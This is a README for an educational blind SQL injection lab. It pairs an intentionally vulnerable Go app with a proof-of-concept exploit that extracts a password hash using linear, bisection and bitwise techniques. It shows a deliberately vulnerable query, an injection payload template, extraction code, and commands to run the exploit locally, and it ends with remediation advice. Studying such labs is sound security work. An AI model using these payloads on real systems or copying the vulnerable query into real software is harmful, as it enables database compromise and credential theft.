# Blind SQLi Lab

A self-contained lab for studying boolean-based blind SQL injection. It pairs an
intentionally vulnerable Go web application (`zerosec-app`) with a proof-of-concept exploit
(`poc-script`) that extracts a password hash from the database using three different
techniques, so their cost can be compared directly on the same target.

## Scope and intent

The vulnerable endpoint is a real-time username availability check — the kind of "harmless"
autocomplete feature commonly added for UX. It returns no error messages and no query
output, only a boolean signal ("username available" / "username taken"). That single bit per
request is enough to reconstruct stored data character by character.

The application is deliberately inconsistent: the email-check endpoint uses a prepared
statement and is safe, while the username-check endpoint concatenates input directly into the
SQL string and is not. A single concatenation point is enough to compromise the database.

## Legal notice

This project is for educational use in a controlled, local environment only. `zerosec-app` is
intentionally vulnerable — do not expose it to a network, and do not use these techniques
against systems you are not explicitly authorized to test.

## Architecture

```
poc-bsqli.go  ──  GET /check-username?username=<payload>  ──▶  zerosec-app (Go, :8081)
   (attacker) ◀──  {"message":"username unavailable"|"username available"}  ──┘
                                                                          │ concatenated SQL
                                                                          ▼
                                                              MySQL: sql_injection_demo.users
```

| Component | Stack | Role |
|---|---|---|
| [`zerosec-app/`](zerosec-app/) | Go 1.23, `net/http`, HTMX, MySQL | Intentionally vulnerable target application |
| [`poc-script/poc-bsqli.go`](poc-script/poc-bsqli.go) | Go (stdlib only) | Exploit automating the three extraction techniques |

The database is seeded with one user whose password is a SHA-512 hash (128 hex characters),
which serves as the extraction target.

## The vulnerability

In [`zerosec-app/main.go`](zerosec-app/main.go), `/check-username` builds its query by string
concatenation:

```go
query := "SELECT EXISTS(SELECT 1 FROM users WHERE username='" + username + "');"
db.QueryRow(query).Scan(&exists)
// exists == 1 → "username unavailable"   (condition TRUE)
// exists == 0 → "username available"     (condition FALSE)
```

Because the input lands inside a quoted string, the exploit closes the quote and injects a
boolean condition using the template:

```
{target}' AND {condition}); -- -
```

which produces:

```sql
SELECT EXISTS(SELECT 1 FROM users WHERE username='antonio' AND {condition}); -- -');
```

The response acts as a boolean oracle:

| JSON response | Meaning | Oracle |
|---|---|---|
| `"username unavailable"` | `EXISTS()` returned 1, row found | TRUE |
| `"username available"` | no row matched | FALSE |

Any question of the form *"is the N-th character's ASCII value related to X?"* can be answered
one bit at a time.

## Extraction techniques

All three answer the same question — the character at position `i` — but search the printable
ASCII range `[32, 126]` (95 values) differently.

### 1. Substring (linear scan)

Tests each ASCII value in sequence until a match:

```go
for c := 32; c <= 126; c++ {
    if oracle(fmt.Sprintf("ASCII(SUBSTRING(password,%d,1))=%d", i, c)) {
        break
    }
}
```

Up to 95 requests per character (~48 average). Simple but slow.

### 2. Bisection (binary search)

Asks whether the value is `<= mid` and halves the range each step:

```go
low, high := 32, 126
for low <= high {
    mid := (low + high) / 2
    if oracle(fmt.Sprintf("ASCII(SUBSTRING(password,%d,1)) <= %d", i, mid)) {
        high = mid - 1
    } else {
        low = mid + 1
    }
}
// low holds the exact ASCII value
```

About 7 requests per character (`⌈log₂95⌉`).

### 3. SQL-Anding (bitwise)

Reconstructs each character by probing its 7 significant bits independently with bitwise AND:

```go
c := 0
for bit := 0; bit < 7; bit++ {
    if oracle(fmt.Sprintf("ASCII(SUBSTRING(password,%d,1)) & %d > 0", i, 1<<bit)) {
        c |= 1 << bit
    }
}
```

Exactly 7 requests per character, independent of the value — deterministic and easy to
parallelize.

### Comparison

For the 128-character SHA-512 hash target:

| Technique | Req/char | Total (128 chars) | Complexity |
|---|---:|---:|---|
| Substring (linear) | up to 95 (~48 avg) | ~6,144 – 12,160 | `O(n × 95)` |
| Bisection | ~7 | ~896 | `O(n × log₂95)` |
| SQL-Anding (bitwise) | 7 (fixed) | 896 | `O(n × 7)` |

The exploit prints the actual request count and elapsed time per method at the end of the run.

## Running the lab

### With Docker (recommended)

The whole lab — MySQL, the seeded database, and the vulnerable app — is packaged with
Docker Compose, so the only requirement is Docker. No local Go or MySQL needed.

```bash
docker compose up --build        # starts MySQL + the app on http://localhost:8081
```

The database schema and the sample user are seeded automatically on first start from
[`zerosec-app/database/init.sql`](zerosec-app/database/init.sql). In another terminal, run
the exploit against the running app:

```bash
docker compose run --rm poc      # extracts jhondoe's hash with all three techniques
```

To target a different user or host, override the command:

```bash
docker compose run --rm poc -target jhondoe -host http://app:8081
```

Tear everything down (and wipe the database volume) with:

```bash
docker compose down -v
```

### Manual setup

Prefer running directly on the host? You'll need:

- Go 1.23+
- MySQL/MariaDB running locally

### 1. Create the database

```bash
cd zerosec-app
bash setup_db.sh        # or: mysql -u root -p < database/init.sql
```

This creates `sql_injection_demo` and seeds user `jhondoe` (SHA-512 password hash).

### 2. Configure credentials

The app reads a git-ignored `.env`:

```env
export MYSQL_USER=root
export MYSQL_PASSWORD=toor
export MYSQL_HOST=127.0.0.1
export MYSQL_PORT=3306
export MYSQL_DB=sql_injection_demo
```

### 3. Start the application

```bash
cd zerosec-app
go run main.go          # serves on :8081
```

[http://localhost:8081](http://localhost:8081) hosts the registration screen whose real-time
username check is the vulnerable endpoint.

### 4. Run the exploit

The default target is username `antonio`; either register it through the UI or point the
exploit at the seeded user:

```bash
cd poc-script
go run poc-bsqli.go -host http://localhost:8081 -target jhondoe
```

Before extracting, the exploit runs oracle sanity checks (`1=1` must be TRUE, `1=0` FALSE),
counts the table rows, and discovers the password length so the loops terminate cleanly.

| Flag | Default | Description |
|---|---|---|
| `-host` | `http://localhost:8081` | Base URL of the target application |
| `-target` | `antonio` | Existing username to attack |

## Project structure

```
blind-sqli-techniques/
├── docker-compose.yml        # Full lab: MySQL + app (+ on-demand exploit)
├── poc-script/
│   ├── poc-bsqli.go          # Exploit: oracle + 3 extraction techniques
│   └── Dockerfile            # Exploit runner image
└── zerosec-app/              # Vulnerable target application
    ├── main.go               # Go server; vulnerable /check-username endpoint
    ├── Dockerfile            # App image (multi-stage Go build)
    ├── home.html             # Landing page
    ├── register.html         # Registration screen (real-time HTMX check)
    ├── database/init.sql     # Schema + sample user seed
    ├── setup_db.sh           # Database recreation helper (manual setup)
    ├── static/               # CSS and images
    └── .env                  # MySQL credentials (git-ignored, manual setup)
```

## Remediation

The fix is parameterized queries — the same approach the email endpoint already uses:

```go
// Vulnerable
query := "SELECT EXISTS(SELECT 1 FROM users WHERE username='" + username + "');"
db.QueryRow(query).Scan(&exists)

// Fixed
stmt, _ := db.Prepare("SELECT EXISTS(SELECT 1 FROM users WHERE username = ?)")
stmt.QueryRow(username).Scan(&exists)
```

Supporting controls: parameterize every query without exception, hash passwords with a slow
salted algorithm (bcrypt/argon2) instead of plain SHA-512, rate-limit autocomplete endpoints,
apply least privilege to the database user, and alert on anomalous volumes of boolean queries.

## References

- [OWASP — Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
- [PortSwigger — Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind)
- [OWASP — SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
